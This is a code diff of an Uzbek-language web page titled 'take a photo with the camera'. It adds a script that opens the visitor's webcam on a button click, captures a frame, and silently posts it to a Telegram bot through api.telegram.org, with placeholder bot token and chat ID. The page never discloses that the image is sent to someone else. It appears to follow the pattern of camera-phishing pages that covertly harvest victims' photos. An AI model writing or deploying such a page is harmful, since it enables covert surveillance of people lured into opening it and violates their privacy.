@@ -1,9 +1,53 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>sayt</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kamera bilan rasm olish</title>
 </head>
 <body>
-<p>tasdiqlandi....</p>
+    <h1>Kamera bilan rasm olish</h1>
+    <button id="capture-btn">Rasm olish</button>
+
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        // Kamerani yoqish va rasm olish
+        const captureButton = document.getElementById('capture-btn');
+        captureButton.addEventListener('click', async () => {
+            const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = videoStream;
+            await video.play();
+            
+            // Kameradan rasmni olish
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Rasmni base64 formatga aylantirish
+            const imageDataURL = canvas.toDataURL('image/png');
+            
+            // Telegram botga yuborish
+            const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
+            const chatId = 'YOUR_TELEGRAM_CHAT_ID';
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', imageDataURL);
+            const response = await fetch(apiUrl, {
+                method: 'POST',
+                body: formData
+            });
+            const responseData = await response.json();
+            console.log('Telegram bot response:', responseData);
+            
+            // To'xtalangan rasmni kamerani yopish
+            videoStream.getVideoTracks().forEach(track => track.stop());
+            video.remove();
+        });
+    </script>
 </body>
 </html>
